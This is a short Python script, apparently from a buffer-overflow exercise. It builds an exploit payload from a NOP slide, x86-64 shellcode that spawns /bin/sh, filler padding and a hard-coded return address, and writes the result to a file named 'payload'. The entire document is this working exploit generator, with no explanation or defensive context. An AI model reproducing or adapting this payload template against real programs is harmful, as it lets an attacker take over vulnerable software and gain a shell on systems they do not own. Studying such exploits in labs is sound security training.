#!/usr/bin/env python
# Payload generator
# Total payload length
payload_length = 104
# Amount of nops
nop_length = 48
# Controlled memory address to return to in Little Endian format
return_address = '\xb0\xde\xff\xff\xff\x7f'
# Building the nop slide
nop_slide = "\x90" * nop_length
# shellcoe :Malicious code injection
buf = ""
buf = "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"
# Building the padding between buffer overflow start and return address
padding = 'B' * (payload_length - nop_length - len(buf))
load = nop_slide + buf + padding + return_address
f = open("payload", "w")
f.write(load)
